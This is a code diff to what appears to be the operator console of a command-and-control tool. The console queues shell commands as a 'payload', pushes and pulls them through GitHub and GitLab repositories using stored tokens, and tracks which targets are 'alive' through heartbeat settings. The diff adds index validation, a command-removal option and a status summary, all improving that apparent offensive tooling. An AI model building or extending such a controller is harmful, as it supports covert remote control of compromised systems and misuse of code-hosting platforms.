@@ -64,8 +64,8 @@ class RepoTarget:
 class ControlConfig:
     github_token: str = ""
     gitlab_token: str = ""
-    repos: list = field(default_factory=list)
-    commands: list = field(default_factory=list)
+    repos: list[RepoTarget] = field(default_factory=list)
+    commands: list[str] = field(default_factory=list)
     heartbeat_redirect: str = ""
     heartbeat_tracking: str = ""
     heartbeat_interval: int = 300
@@ -371,6 +371,7 @@ HELP_TEXT = f"""
 {C.BOLD}Commands:{C.RESET}
   {C.GREEN}cmd <command>{C.RESET}                       — Add command to payload
   {C.GREEN}cmds{C.RESET}                                — List current commands
+  {C.GREEN}rm_cmd <index>{C.RESET}                      — Remove command by index
   {C.GREEN}clear{C.RESET}                               — Clear all commands
 
 {C.BOLD}Heartbeat:{C.RESET}
@@ -393,6 +394,7 @@ HELP_TEXT = f"""
   {C.GREEN}save{C.RESET}                                — Save config to disk
 
 {C.BOLD}Other:{C.RESET}
+  {C.GREEN}status{C.RESET}                              — Quick summary of config
   {C.GREEN}help{C.RESET}                                — This help
   {C.GREEN}exit{C.RESET}                                — Quit
 """
@@ -436,6 +438,8 @@ def interactive_shell(config: ControlConfig):
         elif action == "rm":
             try:
                 idx = int(arg) - 1
+                if idx < 0:
+                    raise IndexError("Index must be positive")
                 removed = config.repos.pop(idx)
                 print(f"  {C.YELLOW}- [{removed.platform}] {removed.owner}/{removed.repo}{C.RESET}")
             except (ValueError, IndexError):
@@ -475,6 +479,16 @@ def interactive_shell(config: ControlConfig):
             else:
                 for i, cmd in enumerate(config.commands):
                     print(f"  {i+1}. {cmd}")
+
+        elif action == "rm_cmd":
+            try:
+                idx = int(arg) - 1
+                if idx < 0:
+                    raise IndexError("Index must be positive")
+                removed = config.commands.pop(idx)
+                print(f"  {C.YELLOW}- {removed}{C.RESET}")
+            except (ValueError, IndexError):
+                print(f"  {C.RED}Invalid index{C.RESET}")
 
         elif action == "clear":
             config.commands.clear()
@@ -541,6 +555,8 @@ def interactive_shell(config: ControlConfig):
             if arg:
                 try:
                     idx = int(arg) - 1
+                    if idx < 0:
+                        raise IndexError("Index must be positive")
                     r = config.repos[idx]
                     print(f"  Pushing to {_repo_label(r)}...")
                     ok = push_to_repo(r, config, payload, pad=use_pad)
@@ -563,6 +579,8 @@ def interactive_shell(config: ControlConfig):
         elif action == "pull":
             try:
                 idx = int(arg) - 1
+                if idx < 0:
+                    raise IndexError("Index must be positive")
                 r = config.repos[idx]
                 print(f"  Pulling from {_repo_label(r)}...")
                 data = pull_from_repo(r, config)
@@ -573,6 +591,14 @@ def interactive_shell(config: ControlConfig):
                     print(f"  {C.RED}No payload found or repo unreachable{C.RESET}")
             except (ValueError, IndexError):
                 print(f"  {C.RED}Invalid index{C.RESET}")
+
+        elif action == "status":
+            alive = sum(1 for r in config.repos if r.alive)
+            print(f"  Repos: {len(config.repos)} ({alive} alive)")
+            print(f"  Commands: {len(config.commands)} queued")
+            print(f"  Heartbeat: {'configured' if config.heartbeat_redirect else 'not set'}")
+            print(f"  GitHub token: {'set' if config.github_token else 'not set'}")
+            print(f"  GitLab token: {'set' if config.gitlab_token else 'not set'}")
 
         elif action == "save":
             config.save()
